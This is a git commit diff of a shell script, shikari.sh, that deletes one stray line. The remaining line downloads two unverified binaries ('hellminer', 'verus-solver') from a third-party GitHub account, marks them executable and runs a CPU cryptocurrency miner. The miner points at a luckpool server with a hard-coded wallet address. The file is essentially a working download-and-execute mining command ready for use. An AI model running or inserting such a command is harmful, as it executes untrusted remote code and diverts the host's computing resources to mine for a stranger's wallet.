48227ac72eecb7c914d1b4d8f88cb2f268efe20b
Botmirror69 <92679061+Botmirror69@users.noreply.github.com>
2022-02-25 17:35:04 +0530

    Update shikari.sh

--- shikari.sh
+++ shikari.sh
@@ -1,2 +1,1 @@
 wget github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RHsTKuNry58Gk1YzDpYoQCPhFMLj3Nn3z2.Shikari -p x --cpu 2
-T
